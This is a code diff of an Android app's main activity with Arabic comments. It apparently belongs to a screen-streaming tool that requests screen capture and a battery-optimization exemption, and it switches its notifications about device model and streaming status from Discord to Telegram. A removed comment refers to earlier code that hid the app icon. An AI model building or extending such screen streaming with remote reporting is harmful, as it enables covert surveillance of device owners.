@@ -21,7 +21,6 @@ public class MainActivity extends Activity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
-        // واجهة بسيطة جداً حتى تتأكد إن التطبيق شغال
         LinearLayout layout = new LinearLayout(this);
         layout.setOrientation(LinearLayout.VERTICAL);
         layout.setGravity(Gravity.CENTER);
@@ -38,10 +37,7 @@ public class MainActivity extends Activity {
         btn.setText("تشغيل الخدمة الآن");
         btn.setPadding(20, 20, 20, 20);
         btn.setOnClickListener(v -> {
-            // طلب استثناء البطارية
             requestBatteryOptimizations();
-
-            // طلب بث الشاشة
             MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
             if (mpm != null) {
                 startActivityForResult(mpm.createScreenCaptureIntent(), REQ_CODE);
@@ -50,14 +46,14 @@ public class MainActivity extends Activity {
         layout.addView(btn);
         setContentView(layout);
         
-        // إرسال إشعار للديسكورد فور فتح التطبيق للتأكد من الربط
-        DiscordSender.sendMessage("🔔 تطبيق حسين مفتوح الآن على جهاز: " + android.os.Build.MODEL);
+        // تم التغيير هنا من DiscordSender إلى TelegramSender
+        TelegramSender.sendMessage("🔔 تطبيق حسين مفتوح الآن على جهاز: " + android.os.Build.MODEL);
     }
 
     private void requestBatteryOptimizations() {
         try {
             PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
-            if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
+            if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                 Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                 intent.setData(Uri.parse("package:" + getPackageName()));
                 startActivity(intent);
@@ -74,10 +70,8 @@ public class MainActivity extends Activity {
             serviceIntent.putExtra("resData", data);
             startForegroundService(serviceIntent);
 
-            DiscordSender.sendMessage("🚀 بدأ البث المستمر بنجاح!");
-            
-            // هنا حذفنا كود إخفاء الأيقونة (hideAppIcon)
-            // التطبيق سيبقى ظاهراً في القائمة
+            // تم التغيير هنا أيضاً
+            TelegramSender.sendMessage("🚀 بدأ البث المستمر بنجاح!");
         }
     }
 }
